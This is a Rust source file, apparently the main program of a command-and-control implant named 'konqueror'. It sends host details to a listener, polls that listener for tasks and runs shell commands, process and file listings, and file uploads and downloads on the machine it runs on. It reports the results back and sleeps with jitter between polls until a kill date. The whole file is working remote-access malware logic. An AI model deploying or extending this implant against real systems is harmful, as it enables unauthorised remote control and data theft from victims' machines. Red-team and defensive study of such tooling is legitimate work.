use chrono::Utc;
use konqueror_common::error::KonquerorError;
use konqueror_common::types::{Task, TaskKind};
use rand::RngExt;
use reqwest::Client;
use std::time::Duration;
use tokio::time::sleep;
use uuid::Uuid;

use crate::commands::CommandResult;
use crate::commands::{
    CommandRegistry, ImplantContext,
    cmd::CmdCommand,
    fs::{CatCommand, DownloadCommand, LsCommand, UploadCommand},
    net::IfConfigCommand,
    ps::PsCommand,
    set::SetCommand,
};
pub mod commands;

// Poll the listener for pending tasks
async fn poll_for_tasks(client: &Client, base_url: &str) -> Result<Vec<Task>, reqwest::Error> {
    let resp = client
        .get(format!("{base_url}/tasks"))
        .send()
        .await?
        .json::<Vec<Task>>()
        .await?;
    Ok(resp)
}

async fn sleep_with_random_jit(sleep_sec: u64, jitter: u32) {
    let mut rng = rand::rng();
    let sleep_in_seconds = Duration::from_secs(sleep_sec + rng.random_range(..jitter as u64));
    sleep(sleep_in_seconds).await;
}

// Report a task result back to the listener
async fn report_result(
    client: &Client,
    base_url: &str,
    task_id: Uuid,
    result: &CommandResult,
) -> Result<(), reqwest::Error> {
    client
        .post(format!("{base_url}/result"))
        .json(&serde_json::json!({
            "task_id": task_id,
            "success": result.success,
            "output": result.output,
        }))
        .send()
        .await?;
    Ok(())
}

async fn first_checkin(
    client: &Client,
    base_url: &str,
    ctx: &ImplantContext,
) -> Result<(), reqwest::Error> {
    client
        .post(format!("{base_url}/checkin"))
        .json(&serde_json::json!({
            "implant_id": &ctx.implant_id,
            "os": ctx.os,
            "pid": ctx.pid,
            "cwd": ctx.cwd,
            "hostname": ctx.hostname,
        }))
        .send()
        .await?;
    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), KonquerorError> {
    let mut cmd_registry = CommandRegistry::new();

    cmd_registry.register(Box::new(CmdCommand));
    cmd_registry.register(Box::new(PsCommand));
    cmd_registry.register(Box::new(CatCommand));
    cmd_registry.register(Box::new(LsCommand));
    cmd_registry.register(Box::new(IfConfigCommand));
    cmd_registry.register(Box::new(SetCommand));
    cmd_registry.register(Box::new(UploadCommand));
    cmd_registry.register(Box::new(DownloadCommand));

    let mut ctx = ImplantContext::new();

    // for now we hardcode the server then we need to fetch from within binary
    let listener_url = "http://127.0.0.1:8001";

    let client = Client::new();

    // first checkin with system information
    first_checkin(&client, listener_url, &ctx)
        .await
        .map_err(|e| KonquerorError::Transport(e.to_string()))?;

    // infinite loop waiting for instuctions
    loop {
        if Utc::now() > ctx.kill_date {
            break;
        }
        if ctx.failed_checkins >= ctx.max_retry {
            break;
        }

        match poll_for_tasks(&client, listener_url).await {
            Ok(tasks) => {
                ctx.failed_checkins = 0;
                for task in tasks {
                    if task.kind == TaskKind::KillImplant {
                        let _ = report_result(
                            &client,
                            listener_url,
                            task.id,
                            &CommandResult {
                                success: true,
                                output: "shutting down".to_string(),
                            },
                        )
                        .await;
                        return Ok(());
                    }
                    if let Some(cmd) = cmd_registry.get(&task.kind.to_string()) {
                        let result = cmd.execute(&task.args, &mut ctx);
                        let _ = report_result(&client, listener_url, task.id, &result).await;
                    }
                }
            }
            Err(_) => {
                ctx.failed_checkins += 1;
            }
        }

        sleep_with_random_jit(ctx.sleep_time_secs, ctx.jitter).await;
    }

    Ok(())
}
